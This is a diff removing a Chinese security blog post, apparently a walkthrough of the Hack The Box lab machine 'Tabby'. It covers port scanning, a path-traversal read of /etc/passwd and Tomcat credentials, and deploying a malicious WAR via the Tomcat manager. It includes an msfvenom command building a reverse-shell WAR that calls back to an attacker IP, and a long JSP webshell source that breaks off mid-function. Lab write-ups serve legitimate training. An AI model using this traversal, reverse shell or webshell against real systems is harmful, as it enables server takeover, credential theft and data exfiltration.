@@ -1,877 +1,0 @@
-<!DOCTYPE html>
-<html lang="en-us">
-    <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='信息搜集 扫一波端口：
-root@wh1sper:~/tools/dirsearch# nmap -sT 10.10.10.194Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 05:37 PDTNmap scan report for 10.10.10.194 (10.10.10.194)Host is up (0.27s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http8080/tcp open http-proxyNmap done: 1 IP address (1 host up) scanned in 639.04 secondsroot@wh1sper:~/tools/dirsearch#访问发现是个Tomcat的默认页面：
-访问80端口，在首页发现news.php，不过这个域名没办法访问，把他修改成靶机的内网ip即可访问：
-目录穿越&#43;任意文件读取 在 file= 参数我们可以想到目录穿越漏洞，访问 http://10.10.10.194/news.php?file=../../../../etc/passwd 可以获取到passwd文件：
-root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsesshd:x:111:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsetomcat:x:997:997::/opt/tomcat:/bin/falsemysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/falseash:x:1000:1000:clive:/home/ash:/bin/bash可以看到这个靶机上面出了root还用tomcat、ash等用户。'><title>HackTheBoxTabby</title>
-
-<link rel='canonical' href='https://example.com/p/hacktheboxtabby/'>
-
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='HackTheBoxTabby'>
-<meta property='og:description' content='信息搜集 扫一波端口：
-root@wh1sper:~/tools/dirsearch# nmap -sT 10.10.10.194Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 05:37 PDTNmap scan report for 10.10.10.194 (10.10.10.194)Host is up (0.27s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http8080/tcp open http-proxyNmap done: 1 IP address (1 host up) scanned in 639.04 secondsroot@wh1sper:~/tools/dirsearch#访问发现是个Tomcat的默认页面：
-访问80端口，在首页发现news.php，不过这个域名没办法访问，把他修改成靶机的内网ip即可访问：
-目录穿越&#43;任意文件读取 在 file= 参数我们可以想到目录穿越漏洞，访问 http://10.10.10.194/news.php?file=../../../../etc/passwd 可以获取到passwd文件：
-root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsesshd:x:111:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsetomcat:x:997:997::/opt/tomcat:/bin/falsemysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/falseash:x:1000:1000:clive:/home/ash:/bin/bash可以看到这个靶机上面出了root还用tomcat、ash等用户。'>
-<meta property='og:url' content='https://example.com/p/hacktheboxtabby/'>
-<meta property='og:site_name' content='wh1sper'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' />
-<meta name="twitter:title" content="HackTheBoxTabby">
-<meta name="twitter:description" content="信息搜集 扫一波端口：
-root@wh1sper:~/tools/dirsearch# nmap -sT 10.10.10.194Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 05:37 PDTNmap scan report for 10.10.10.194 (10.10.10.194)Host is up (0.27s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http8080/tcp open http-proxyNmap done: 1 IP address (1 host up) scanned in 639.04 secondsroot@wh1sper:~/tools/dirsearch#访问发现是个Tomcat的默认页面：
-访问80端口，在首页发现news.php，不过这个域名没办法访问，把他修改成靶机的内网ip即可访问：
-目录穿越&#43;任意文件读取 在 file= 参数我们可以想到目录穿越漏洞，访问 http://10.10.10.194/news.php?file=../../../../etc/passwd 可以获取到passwd文件：
-root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsesshd:x:111:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsetomcat:x:997:997::/opt/tomcat:/bin/falsemysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/falseash:x:1000:1000:clive:/home/ash:/bin/bash可以看到这个靶机上面出了root还用tomcat、ash等用户。">
-    </head>
-    <body class="">
-    <script>
-        (function() {
-            const colorSchemeKey = 'StackColorScheme';
-            if(!localStorage.getItem(colorSchemeKey)){
-                localStorage.setItem(colorSchemeKey, "auto");
-            }
-        })();
-    </script><script>
-    (function() {
-        const colorSchemeKey = 'StackColorScheme';
-        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
-        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
-
-        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
-            
-
-            document.body.dataset.scheme = 'dark';
-        } else {
-            document.body.dataset.scheme = 'light';
-        }
-    })();
-</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
-            <aside class="sidebar left-sidebar sticky">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header class="site-info">
-        
-            <figure class="site-avatar">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/avatar_huda2458f72ce188392d75c5d51cd8e24e_373_300x0_resize_box_2.png" width="300"
-                            height="300" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-
-                
-                    <span class="emoji">🍥</span>
-                
-            </figure>
-        
-        <h1 class="site-name"><a href="https://example.com">wh1sper</a></h1>
-        <h2 class="site-description">专注Web安全</h2>
-    </header>
-
-    <ol class="menu" id="main-menu">
-        
-        
-        
-
-        <li >
-            <a href='/about'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>About</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/archives'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>Archives</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
-</svg>
-
-
-
-                
-                <span>Home</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/search'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-
-        
-            <li id="dark-mode-toggle">
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="8" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="16" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <span>Dark Mode</span>
-            </li>
-        
-    </ol>
-</aside>
-
-            <main class="main full-width">
-    <div id="article-toolbar">
-        <a href="https://example.com" class="back-home">
-            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="15 6 9 12 15 18" />
-</svg>
-
-
-
-            <span>Back</span>
-        </a>
-    </div>
-
-    <article class="main-article">
-    <header class="article-header">
-
-    <div class="article-details">
-    
-
-    <h2 class="article-title">
-        <a href="/p/hacktheboxtabby/">HackTheBoxTabby</a>
-    </h2>
-
-    </div>
-</header>
-
-    <section class="article-content">
-    <p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180858.png" alt=""  /></p>
-<h3 id="信息搜集">信息搜集</h3>
-<p>扫一波端口：</p>
-<pre><code>root@wh1sper:~/tools/dirsearch# nmap -sT 10.10.10.194
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 05:37 PDT
-Nmap scan report for 10.10.10.194 (10.10.10.194)
-Host is up (0.27s latency).
-Not shown: 997 closed ports
-PORT     STATE SERVICE
-22/tcp   open  ssh
-80/tcp   open  http
-8080/tcp open  http-proxy
- 
-Nmap done: 1 IP address (1 host up) scanned in 639.04 seconds
-root@wh1sper:~/tools/dirsearch#
-</code></pre><p>访问发现是个Tomcat的默认页面：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180905.png" alt="img"  /></p>
-<p>访问80端口，在首页发现news.php，不过这个域名没办法访问，把他修改成靶机的内网ip即可访问：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180912.png" alt="img"  /></p>
-<h3 id="目录穿越任意文件读取">目录穿越+任意文件读取</h3>
-<p>在 <code>file=</code> 参数我们可以想到目录穿越漏洞，访问 <code>http://10.10.10.194/news.php?file=../../../../etc/passwd</code> 可以获取到passwd文件：</p>
-<pre><code>root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
-syslog:x:104:110::/home/syslog:/usr/sbin/nologin
-_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
-tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
-uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
-tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
-landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
-pollinate:x:110:1::/var/cache/pollinate:/bin/false
-sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
-systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
-lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
-tomcat:x:997:997::/opt/tomcat:/bin/false
-mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
-ash:x:1000:1000:clive:/home/ash:/bin/bash
-</code></pre><p>可以看到这个靶机上面出了root还用tomcat、ash等用户。</p>
-<p>但是这个目录穿越只是任意文件读取，并不是文件包含漏洞：</p>
-<pre><code>root@wh1sper:~/tools/dirsearch# curl http://10.10.10.194/news.php?file=../../../../var/www/html/news.php
-&lt;?php
-$file = $_GET['file'];
-$fh = fopen(&quot;files/$file&quot;,&quot;r&quot;);
-while ($line = fgets($fh)) {
-  echo($line);
-}
-fclose($fh);
-?&gt;
-root@wh1sper:~/tools/dirsearch#
-</code></pre><p>我们可以看到他直接输出了PHP的代码，并没有去当作PHP执行，所以是任意文件读取。</p>
-<p>我们回到Tomcat页面，页面最后一行提示了我们 <code>Users are defined in /etc/tomcat9/tomcat-users.xml</code> ，如果我们能读取这个文件的话，我们就可以用里面的用户名密码登录tomcat的管理后台了</p>
-<p>但是页面提示的/etc/tomcat-users.xml并不能读取，后来网上查了下tomcat默认安装路径可能是/usr/share/tomcat9，于是尝试 <code>/usr/share/tomcat9/etc/tomcat-users.xml</code> ，成功读取到了文件：</p>
-<pre><code>root@wh1sper:~/HTB/machine/Tabby# curl http://10.10.10.194/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;!--
-  Licensed to the Apache Software Foundation (ASF) under one or more
-  contributor license agreements.  See the NOTICE file distributed with
-  this work for additional information regarding copyright ownership.
-  The ASF licenses this file to You under the Apache License, Version 2.0
-  (the &quot;License&quot;); you may not use this file except in compliance with
-  the License.  You may obtain a copy of the License at
- 
-      http://www.apache.org/licenses/LICENSE-2.0
- 
-  Unless required by applicable law or agreed to in writing, software
-  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
-  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-  See the License for the specific language governing permissions and
-  limitations under the License.
---&gt;
-&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;
-              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
-              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;
-              version=&quot;1.0&quot;&gt;
-&lt;!--
-  NOTE:  By default, no user is included in the &quot;manager-gui&quot; role required
-  to operate the &quot;/manager/html&quot; web application.  If you wish to use this app,
-  you must define such a user - the username and password are arbitrary. It is
-  strongly recommended that you do NOT use one of the users in the commented out
-  section below since they are intended for use with the examples web
-  application.
---&gt;
-&lt;!--
-  NOTE:  The sample user and role entries below are intended for use with the
-  examples web application. They are wrapped in a comment and thus are ignored
-  when reading this file. If you wish to configure these users for use with the
-  examples web application, do not forget to remove the &lt;!.. ..&gt; that surrounds
-  them. You will also need to set the passwords to something appropriate.
---&gt;
-&lt;!--
-  &lt;role rolename=&quot;tomcat&quot;/&gt;
-  &lt;role rolename=&quot;role1&quot;/&gt;
-  &lt;user username=&quot;tomcat&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;tomcat&quot;/&gt;
-  &lt;user username=&quot;both&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;tomcat,role1&quot;/&gt;
-  &lt;user username=&quot;role1&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;role1&quot;/&gt;
---&gt;
-   &lt;role rolename=&quot;admin-gui&quot;/&gt;
-   &lt;role rolename=&quot;manager-script&quot;/&gt;
-   &lt;user username=&quot;tomcat&quot; password=&quot;$3cureP4s5w0rd123!&quot; roles=&quot;admin-gui,manager-script&quot;/&gt;
-&lt;/tomcat-users&gt;
-root@wh1sper:~/HTB/machine/Tabby#
-</code></pre><p>然后后台地址是： <code>10.10.10.194:8080/manager/</code> (这个登录不上)，另一个是 <code>10.10.10.194:8080/host-manager/html</code> 输入用户名tomcat密码$3cureP4s5w0rd123!就可以进去</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180921.png" alt="img"  /></p>
-<p>我们目的是Getshell，但是这个后台并不能文件上传，但但是tomcat可以独特地通过命令行去部署.war包</p>
-<h3 id="curl远程部署恶意war包">Curl远程部署恶意war包</h3>
-<p>在tomcat-users.xml中写了tomcat用户没有manager-gui角色，因此无法登录manager/html页面，但是tomcat用户还具有manager-script角色，所以可以执行命令</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180957.png" alt="img"  /></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181009.png" alt="img"  /></p>
-<p>tomcat命令行部署war包：https://blog.csdn.net/chumo6161/article/details/100615971</p>
-<p>tomcat manageapp操作方法：<a class="link" href="http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html#Executing_Manager_Commands_With_Ant"  target="_blank" rel="noopener"
-    >http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html</a></p>
-<p>我们用一个免杀jsp马来制作好war包，然后通过curl远程部署到靶机上面：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181020.png" alt="img"  /></p>
-<p>我的免杀base64用不了，换了msf的马：</p>
-<pre><code>root@wh1sper:~/HTB/machine/Tabby# msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.14.81 lport=10086 -f war -o Formalhaut.war
-[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-[-] No arch selected, selecting arch: x86 from the payload
-No encoder specified, outputting raw payload
-Payload size: 68 bytes
-Final size of war file: 1538 bytes
-Saved as: Formalhaut.war
-root@wh1sper:~/HTB/machine/Tabby# ls
-Formalhaut.war  JSP.jsp  shell.jsp  shell.war  wh1sper.war
-root@wh1sper:~/HTB/machine/Tabby# unzip Formalhaut.war 
-Archive:  Formalhaut.war
-   creating: META-INF/
-  inflating: META-INF/MANIFEST.MF    
-   creating: WEB-INF/
-  inflating: WEB-INF/web.xml         
-  inflating: ubvqchbvesep.jsp        
-root@wh1sper:~/HTB/machine/Tabby#
-</code></pre><p>监听10086端口，访问jsp文件我们就能收到shell：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181033.png" alt="img"  /></p>
-<p>同理可以上传一个jsp菜刀版用蚁剑连接使用图形化文件管理系统：</p>
-<p>jsp菜刀版</p>
-<pre><code>&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;
-&lt;%!String Pwd = &quot;pass&quot;;
- 
-    String EC(String s, String c) throws Exception {
-        return s;
-    }//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);}
- 
-    Connection GC(String s) throws Exception {
-        String[] x = s.trim().split(&quot;\r\n&quot;);
-        Class.forName(x[0].trim()).newInstance();
-        Connection c = DriverManager.getConnection(x[1].trim());
-        if (x.length &gt; 2) {
-            c.setCatalog(x[2].trim());
-        }
-        return c;
-    }
- 
-    void AA(StringBuffer sb) throws Exception {
-        File r[] = File.listRoots();
-        for (int i = 0; i &lt; r.length; i++) {
-            sb.append(r[i].toString().substring(0, 2));
-        }
-    }
- 
-    void BB(String s, StringBuffer sb) throws Exception {
-        File oF = new File(s), l[] = oF.listFiles();
-        String sT, sQ, sF = &quot;&quot;;
-        java.util.Date dt;
-        SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);
-        for (int i = 0; i &lt; l.length; i++) {
-            dt = new java.util.Date(l[i].lastModified());
-            sT = fm.format(dt);
-            sQ = l[i].canRead() ? &quot;R&quot; : &quot;&quot;;
-            sQ += l[i].canWrite() ? &quot; W&quot; : &quot;&quot;;
-            if (l[i].isDirectory()) {
-                sb.append(l[i].getName() + &quot;/\t&quot; + sT + &quot;\t&quot; + l[i].length()
-                        + &quot;\t&quot; + sQ + &quot;\n&quot;);
-            } else {
-                sF += l[i].getName() + &quot;\t&quot; + sT + &quot;\t&quot; + l[i].length() + &quot;\t&quot;
-                        + sQ + &quot;\n&quot;;
-            }
-        }
-        sb.append(sF);
-    }
- 
-    void EE(String s) throws Exception {
-        File f = new File(s);
-        if (f.isDirectory()) {
-            File x[] = f.listFiles();
-            for (int k = 0; k &lt; x.length; k++) {
-                if (!x[k].delete()) {
-                    EE(x[k].getPath());
-                }
-            }
-        }
-        f.delete();
-    }
- 
-    void FF(String s, HttpServletResponse r) throws Exception {
-        int n;
-        byte[] b = new byte[512];
-        r.reset();
-        ServletOutputStream os = r.getOutputStream();
-        BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));
-        os.write((&quot;-&gt;&quot; + &quot;|&quot;).getBytes(), 0, 3);
-        while ((n = is.read(b, 0, 512)) != -1) {
-            os.write(b, 0, n);
-        }
-        os.write((&quot;|&quot; + &quot;&lt;-&quot;).getBytes(), 0, 3);
-        os.close();
-        is.close();
-    }
- 
-    void GG(String s, String d) throws Exception {
-        String h = &quot;0123456789ABCDEF&quot;;
-        int n;
-        File f = new File(s);
-        f.createNewFile();
-        FileOutputStream os = new FileOutputStream(f);
-        for (int i = 0; i &lt; d.length(); i += 2) {
-            os
-                    .write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d
-                            .charAt(i + 1))));
-        }
-        os.close();
-    }
-  
-    void HH(String s, String d) throws Exception {
-        File sf = new File(s), df = new File(d);
-        if (sf.isDirectory()) {
-            if (!df.exists()) {
-                df.mkdir();
-            }
-            File z[] = sf.listFiles();
-            for (int j = 0; j &lt; z.length; j++) {
-                HH(s + &quot;/&quot; + z[j].getName(), d + &quot;/&quot; + z[j].getName());
-            }
-        } else {
-            FileInputStream is = new FileInputStream(sf);
-            FileOutputStream os = new FileOutputStream(df);
-            int n;
-            byte[] b = new byte[512];
-            while ((n = is.read(b, 0, 512)) != -1) {
-                os.write(b, 0, n);
-            }
-            is.close();
-            os.close();
-        }
-    }
- 
-    void II(String s, String d) throws Exception {
-        File sf = new File(s), df = new File(d);
-        sf.renameTo(df);
-    }
- 
-    void JJ(String s) throws Exception {
-        File f = new File(s);
-        f.mkdir();
-    }
- 
-    void KK(String s, String t) throws Exception {
-        File f = new File(s);
-        SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);
-        java.util.Date dt = fm.parse(t);
-        f.setLastModified(dt.getTime());
-    }
- 
-    void LL(String s, String d) throws Exception {
-        URL u = new URL(s);
-        int n;
-        FileOutputStream os = new FileOutputStream(d);
-        HttpURLConnection h = (HttpURLConnection) u.openConnection();
-        InputStream is = h.getInputStream();
-        byte[] b = new byte[512];
-        while ((n = is.read(b, 0, 512)) != -1) {
-            os.write(b, 0, n);
-        }
-        os.close();
-        is.close();
-        h.disconnect();
-    }
- 
-    void MM(InputStream is, StringBuffer sb) throws Exception {
-        String l;
-        BufferedReader br = new BufferedReader(new InputStreamReader(is));
-        while ((l = br.readLine()) != null) {
-            sb.append(l + &quot;\r\n&quot;);
-        }
-    } 
- 
-    void NN(String s, StringBuffer sb) throws Exception {
-        Connection c = GC(s);
-        ResultSet r = c.getMetaData().getCatalogs();
